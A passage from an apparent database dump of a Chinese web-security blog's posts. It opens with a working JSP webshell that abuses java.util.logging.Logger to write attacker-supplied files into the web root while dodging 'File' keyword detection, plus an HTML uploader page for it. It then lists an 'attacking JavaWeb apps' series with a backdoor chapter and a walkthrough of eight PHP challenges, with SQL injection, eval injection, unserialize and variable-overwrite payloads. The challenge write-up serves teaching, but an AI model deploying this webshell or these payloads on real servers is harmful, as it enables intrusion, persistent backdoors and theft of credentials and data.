File这样的方式去写文件，甚至是</span><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">尽可能的不要出现File关键字。</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。 </span></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。 </span></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">新建2.jsp并访问： </span></strong>\n<pre class=\"brush: java; gutter: true\">&lt;%java.util.logging.Logger l=java.util.logging.Logger.getLogger(&quot;t&quot;);java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter(&quot;t&quot;));%&gt;</pre>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><img src=\"wp-content/uploads/ckfinder/images/1(2).gif\" alt=\"\" /></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><img src=\"wp-content/uploads/ckfinder/images/2(2).gif\" alt=\"\" /></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><img src=\"wp-content/uploads/ckfinder/images/3(1).gif\" alt=\"\" /></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">其他略特殊点的文件读写Demo：</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></strong>\n<div>\n<pre class=\"brush: java; gutter: true\">new FileOutputStream \n  new FileOutputStream(&quot;d:/sb.txt&quot;).write(new String(&quot;123&quot;).getBytes()); \nnew DataOutputStream \n  new DataOutputStream(new FileOutputStream(&quot;d:/1x.txt&quot;)).write(new String(&quot;123&quot;).getBytes()); \nFileWriter fw = new FileWriter(&quot;d:/3.txt&quot;); \n    fw.write(&quot;21&quot;); \n    fw.flush(); \n    fw.close(); \nRandomAccessFile rf = new RandomAccessFile(&quot;d:/14.txt&quot;, &quot;rw&quot;); \n    rf.write(new String(&quot;3b&quot;).getBytes()); \n    rf.close();</pre>\n<p></div></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">GetShell.htm:</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></strong></p>\n<p><div></p>\n<pre class=\"brush: html; gutter: true\">&lt;html&gt; \n&lt;head&gt; \n&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; \n&lt;title&gt;jsp-yzmm&lt;/title&gt; \n&lt;/head&gt; \n&lt;style&gt; \n.main{width:980px;height:600px;margin:0 auto;} \n.url{width:300px;} \n.fn{width:80px;} \n.content{width:80%;height:60%;} \n&lt;/style&gt; \n&lt;script&gt; \n  function upload(){ \n    var url = document.getElementById(&#039;url&#039;).value, \n      content = document.getElementById(&#039;content&#039;).value, \n      fileName = document.getElementById(&#039;fn&#039;).value, \n      form = document.getElementById(&#039;fm&#039;); \n    if(url.length == 0){ \n      alert(&quot;Url not allowd empty!&quot;); \n      return ; \n    } \n    if(content.length == 0){ \n      alert(&quot;Content not allowd empty!&quot;); \n      return ; \n    } \n    if(fileName.length == 0){ \n      alert(&quot;FileName not allowd empty!&quot;); \n      return ; \n    } \n    form.action = url; \n    form.submit(); \n  } \n&lt;/script&gt; \n&lt;body&gt; \n&lt;div class=&quot;main&quot;&gt; \n  &lt;form id=&quot;fm&quot; method=&quot;post&quot;&gt;   \n    URL:&lt;input type=&quot;text&quot; value=&quot;http://localhost/Struts2/css3.jsp&quot; class=&quot;url&quot; id=&quot;url&quot; /&gt;   \n    FileName:&lt;input type=&quot;text&quot; name=&quot;f&quot; value=&quot;css.jsp&quot; class=&quot;fn&quot; id=&quot;fn&quot; /&gt;   \n    &lt;a href=&quot;javascript:upload();&quot;&gt;Upload&lt;/a&gt;&lt;br/&gt; \n    &lt;textarea id=&quot;content&quot; class=&quot;content&quot; name=&quot;t&quot; &gt;&lt;/textarea&gt; \n  &lt;/form&gt; \n&lt;/div&gt; \n&lt;/body&gt; \n&lt;/html&gt;</pre>\n<p></div></p>\n<p><div></div></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">http://xsser.me/caidao/getshell-by-logger.jsp </span></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">http://xsser.me/caidao/getshell-by-logger.txt</span></strong></p>', null, '2013-11-28 15:41:23', '1', '613', null, '0', '2013-12-23 19:13:49'), ('92', '1', '14', '[原创] 攻击JavaWeb应用[1-8]', '园长', '<p>\n<p>	<span style=\"color: rgb(68, 68, 68); font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: rgb(255, 255, 255); \">最新更新了后门篇，记录了下JavaWeb后门相关东东。</span><br /></p>\n<p>	<a href=\"http://pan.baidu.com/s/11hgD9\" style=\"word-wrap: break-word; color: rgb(51, 102, 153); font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: rgb(255, 255, 255); \" target=\"_blank\">攻击JavaWeb应用[1-8].pdf</a><br /></p>\n<p>	<a href=\"http://pan.baidu.com/s/1zfpzJ\" style=\"word-wrap: break-word; color: rgb(51, 102, 153); font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: rgb(255, 255, 255); \" target=\"_blank\">攻击JavaWeb应用[1-8].doc</a><br /></p>\n	<br />\n<p>	内容：</p></p>\n<p><div></p>\n	<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n攻击JavaWeb应用[1]-JavaEE 基础\n攻击JavaWeb应用[2]-CS交互安全\n攻击JavaWeb应用[3]-SQL注入[1]\n攻击JavaWeb应用[4]-SQL注入[2]\n攻击JavaWeb应用[5]-MVC安全\n攻击JavaWeb应用[6]-程序架构与代码审计\n攻击JavaWeb应用[7]-Server篇[1]\n攻击JavaWeb应用[8]-后门篇\n</pre>\n<p></div></p>', null, '2013-11-28 15:47:23', '1', '544', null, '0', '2013-11-28 15:48:59'), ('112', '2', '5', 'php4fun.sinaapp.com PHP挑战通关攻略', 'blue', '<h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\">\n<p>	challenge 1</h2></p>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#GOAL: get password from admin;\nerror_reporting(0);\nrequire &#39;db.inc.php&#39;;\nfunction clean($str){\n    if(get_magic_quotes_gpc()){\n        $str=stripslashes($str);\n    }\n    return htmlentities($str, ENT_QUOTES);\n}\n$username = @clean((string)$_GET[&#39;username&#39;]);\n$password = @clean((string)$_GET[&#39;password&#39;]);\n$query=&#39;SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;;&#39;;\n$result=mysql_query($query);\nif(!$result || mysql_num_rows($result) &lt; 1){\n    die(&#39;Invalid password!&#39;);\n}\n$row = mysql_fetch_assoc($result);\necho &quot;Hello &quot;.$row[&#39;name&#39;].&quot;&lt;/br&gt;&quot;;\necho &quot;Your password is:&quot;.$row[&#39;pass&#39;].&quot;&lt;/br&gt;&quot;;</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	在单引号内的mysql注入，核心就是逃脱单引号，要么生成一个(htmlentities了单引号，不太可能)，要么...干掉一个。</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<pre class=\"brush:xhtml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://php4fun.sinaapp.com/c1/index.php?username=admin\\&amp;password=%20or%201%23</pre>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	&nbsp;</h2></p>\n<p><p></p>\n	<br />\n	<br />\n<p>	challenge 2</p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#GOAL: gather some phpinfo();\n$str=@(string)$_GET[&#39;str&#39;];\neval(&#39;$str=&quot;&#39;.addslashes($str).&#39;&quot;;&#39;);</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	eval(&#39;$str=&quot;&#39;.addslashes($str).&#39;&quot;;&#39;);这段最后成为php代码 $str=&quot;<strong><em>&quot;，</em></strong>里双引号被addslashes，但内容在双引号内可以${${这里执行代码}}</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://phpchallenges2.sinaapp.com/index.php?str=${${phpinfo()}}</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 3</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n# GOAL: dump the info for the secret id\nrequire &#39;db.inc.php&#39;;\n$id = @(float)$_GET[&#39;id&#39;];\n$secretId = 1;\nif($id == $secretId){\n    echo &#39;Invalid id (&#39;.$id.&#39;).&#39;;\n}\nelse{\n    $query = &#39;SELECT * FROM users WHERE id = \\&#39;&#39;.$id.&#39;\\&#39;;&#39;;\n    $result = mysql_query($query);\n    $row = mysql_fetch_assoc($result);\n    echo &quot;id: &quot;.$row[&#39;id&#39;].&quot;&lt;/br&gt;&quot;;\n    echo &quot;name:&quot;.$row[&#39;name&#39;].&quot;&lt;/br&gt;&quot;;\n}</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	主要是利用php和mysql对float数字型支持的精度不同，精度小的会忽略不能支持的位数。</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://php4fun.sinaapp.com/c3/index.php?id=1.0000000000001</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 4</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#GOAL:get password from admin\n# $yourInfo=array(\n#   &#39;id&#39;    =&gt; 1,\n#   &#39;name&#39;  =&gt; &#39;admin&#39;,\n#   &#39;pass&#39;  =&gt; &#39;xxx&#39;,\n#   &#39;level&#39; =&gt; 1\n# );\nrequire &#39;db.inc.php&#39;;\n$_CONFIG[&#39;extraSecure&#39;]=true;\n//if register globals = on, undo var overwrites\nforeach(array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_REQUEST&#39;,&#39;_COOKIE&#39;) as $method){\n     foreach($$method as $key=&gt;$value){\n          unset($$key);\n     }\n}\n$kw = isset($_GET[&#39;kw&#39;]) ? trim($_GET[&#39;kw&#39;]) : die(&#39;Please enter in a search keyword.&#39;);\nif($_CONFIG[&#39;extraSecure&#39;]){\n     $kw=preg_replace(&#39;#[^a-z0-9_-]#i&#39;,&#39;&#39;,$kw);\n}\n$query = &#39;SELECT * FROM messages WHERE message LIKE \\&#39;%&#39;.$kw.&#39;%\\&#39;;&#39;;\n$result = mysql_query($query);\n$row = mysql_fetch_assoc($result);\necho &quot;id: &quot;.$row[&#39;id&#39;].&quot;&lt;/br&gt;&quot;;\necho &quot;message: &quot;.$row[&#39;message&#39;].&quot;&lt;/br&gt;&quot;;</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	这段$kw在单引号里，看起来只要能使用单引号就行，所以干掉_CONFIG[&#39;extraSecure&#39;]就ok，刚好前面画蛇添足的有可利用的变量unset(不然咋通关？)，然后就是联合查询了。</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://php4fun.sinaapp.com/c4/index.php?kw=&#39;%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&amp;_CONFIG=aaa</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 5</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n# GOAL: overwrite password for admin (id=1)\n#       Try to login as admin\n# $yourInfo=array( //this is your user data in the db\n#   &#39;id&#39;    =&gt; 8,\n#   &#39;name&#39;  =&gt; &#39;jimbo18714&#39;,\n#   &#39;pass&#39;  =&gt; &#39;MAYBECHANGED&#39;,\n#   &#39;level&#39; =&gt; 1\n# );\nrequire &#39;db.inc.php&#39;;\nfunction mres($str) {\n    return mysql_real_escape_string($str);\n}\n$userInfo = @unserialize($_GET[&#39;userInfo&#39;]);\n$query = &#39;SELECT * FROM users WHERE id = \\&#39;&#39;.mres($userInfo[&#39;id&#39;]).&#39;\\&#39; AND pass = \\&#39;&#39;.mres($userInfo[&#39;pass&#39;]).&#39;\\&#39;;&#39;;\n$result = mysql_query($query);\nif(!$result || mysql_num_rows($result) &lt; 1){\n    die(&#39;Invalid password!&#39;);\n}\n$row = mysql_fetch_assoc($result);\nforeach($row as $key =&gt; $value){\n    $userInfo[$key] = $value;\n}\n$oldPass = @$_GET[&#39;oldPass&#39;];\n$newPass = @$_GET[&#39;newPass&#39;];\nif($oldPass == $userInfo[&#39;pass&#39;]){\n    $userInfo[&#39;pass&#39;] = $newPass;\n    $query = &#39;UPDATE users SET pass = \\&#39;&#39;.mres($newPass).&#39;\\&#39; WHERE id = \\&#39;&#39;.mres($userInfo[&#39;id&#39;]).&#39;\\&#39;;&#39;;\n    mysql_query($query);\n    echo &#39;Password Changed.&#39;;\n}\nelse{\n    echo &#39;Invalid old password entered.&#39;;\n}</pre>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	(1) http://www.80vul.com/webzine_0x06/PSTZine_0x06_0x03.txt (站上默认显示的密码就是个提示...估计是哪位大虾顺手改的)<br /></p>\n<p>	(2) $userInfo[&#39;pass&#39;] = $newPass; //这句，改成1</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	(1) 修改jimbo18714密码为8 (2) 再次修改密码，提交时userInfo为8的序列化,newPass为1</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 6</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#GOAL: get the secret;\nclass just4fun {\n    var $enter;\n    var $secret;\n}\nif (isset($_GET[&#39;pass&#39;])) {\n    $pass = $_GET[&#39;pass&#39;];\n    if(get_magic_quotes_gpc()){\n        $pass=stripslashes($pass);\n    }\n    $o = unserialize($pass);\n    if ($o) {\n        $o-&gt;secret = &quot;?????????????????????????????&quot;;\n        if ($o-&gt;secret === $o-&gt;enter)\n            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;\n        else\n            echo &quot;Oh no... You can&#39;t fool me&quot;;\n    }\n    else echo &quot;are you trolling?&quot;;\n}</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h2></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	serialize一个just4fun的对象，序列化之前先赋值给$o-&gt;enter (在本地执行是成功的，php4fun.sinaapp.com不行，代码改了？)</p></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</p></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	(1) 生成序列化的对象</p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nclass just4fun {\n    var $enter;\n    var $secret;\n}\n$a=new just4fun();\n$a-&gt;enter=&#39;?????????????????????????????&#39;;\necho urlencode(serialize($a));</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><p></p>\n<p>	<span style=\"color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\">(2)</span></p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nlink?pass=O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A5%3A%22enter%22%3Bs%3A29%3A%22%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%22%3Bs%3A6%3A%22secret%22%3BN%3B%7D</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 7</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n# GOAL: get the key from $hidden_password[207]\nsession_start();\nerror_reporting(0);\nfunction auth($password, $hidden_password) {\n    $res = 0;\n    if(isset($password) &amp;&amp; $password != &quot;&quot;) {\n        if($password == $hidden_password) {\n            $res = 1;\n        }\n    }\n    $_SESSION[&quot;logged&quot;] = $res;\n    return $res;\n}\nfunction display($res){\n    $aff = htmlentities($res);\n    return $aff;\n}\nif(!isset($_SESSION[&quot;logged&quot;]))\n    $_SESSION[&quot;logged&quot;] = 0;\n$aff = &quot;&quot;;\ninclude(&quot;config.inc.php&quot;);\nforeach($_REQUEST as $request) {\n    if(is_array($request)) {\n        die(&quot;Can not use Array in request!&quot;);\n    }\n}\n$password = $_POST[&quot;password&quot;];\nif(!ini_get(&quot;register_globals&quot;)) {\n    $superglobals = array($_POST, $_GET);\n    if(isset($_SESSION)) {\n        array_unshift($superglobals, $_SESSION);\n    }\n    foreach($superglobals as $superglobal) {\n        extract($superglobal, 0);\n    }\n}\nif((isset($password) &amp;&amp; $password != &quot;&quot; &amp;&amp; auth($password, $hidden_password[207]) == 1) || (is_array($_SESSION) &amp;&amp; $_SESSION[&quot;logged&quot;] == 1)) {\n    $aff = display(&quot;$hidden_password[207]&quot;);\n} else {\n    $aff = display(&quot;Try again&quot;);\n}\necho $aff;</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	get the key from $hidden_password[207] 这句有点模糊，下面的&lsquo;所以&rsquo;可以得到key（绕过REQUEST对数组的判断）</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<pre class=\"brush:xhtml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://php4fun.sinaapp.com/c7/index.php?_SESSION[logged]=1\nPOST: _SESSION=1</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h2 style=\"margin: 0px; padding: 0px; font-size: 18px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	challenge 8</h2></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#GOAL: file_get_content(&#39;sbztz.php&#39;)    : )\n    class just4fun {\n        public $filename;\n        function __toString() {\n            return @file_get_contents($this-&gt;filename);\n        }\n    }\n    $data = stripslashes($_GET[&#39;data&#39;]);\n    if (!$data) {\n        die(&quot;hello from y&quot;);\n    }\n    $token = $data[0];\n    $pass = true; \n    switch ( $token ) {\n        case &#39;a&#39; :\n        case &#39;O&#39; :\n        case &#39;b&#39; :\n        case &#39;i&#39; :\n        case &#39;d&#39; :\n            $pass = ! (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data );\n            break;\n        default:\n            $pass = false;\n    }\n    if (!$pass) {\n      die(&quot;TKS L.N.&quot;);\n    }\n    echo unserialize($data);</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	攻略：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	<a href=\"http://drops.wooyun.org/papers/596\" style=\"color: #0b59b2; text-decoration: none;\">http://drops.wooyun.org/papers/596</a></p></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	<a href=\"http://zone.wooyun.org/content/6697\" style=\"color: #0b59b2; text-decoration: none;\">http://zone.wooyun.org/content/6697</a></p></p>\n<p><h3 style=\"margin: 0px; padding: 0px; font-size: 16px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	所以：</h3></p>\n<p><p style=\"margin: 0px 0px 8px; padding: 0px; color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\"></p>\n<p>	(1) 生成利用的data:</p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nO%3A%2B8%3A&quot;just4fun&quot;%3A1%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A9%3A&quot;sbztz.php&quot;%3B%7D  (注意%2B)</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><p></p>\n<p>	<span style=\"color: #333333; font-family: \'Microsoft YaHei\', Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: #ffffff;\">(2)</span></p></p>\n<pre class=\"brush:php;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nhttp://php4fun.sinaapp.com/c8/index.php?data=O%3A%2B8%3A&quot;just4fun&quot;%3A1%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A9%3A&quot;sbztz.php&quot;%3B%7D</pre>', null, '2013-11-28 16:26:36', '1', '826', null, '1', '2013-11-28 16:35:02'), ('122', '1', '10', '友情链接', '园长', '名称:PHP&Java\n<p>网址:http://p2j.cn</p>\n<p>描述:JavaWeb安全开发</p>\n<p>类型:技术类型博客或网站。</p>', null, '2013-11-27 17:14:56', '1', '1350', null, '102', '2015-08-10 02:18:57'), ('128', '1', '14', 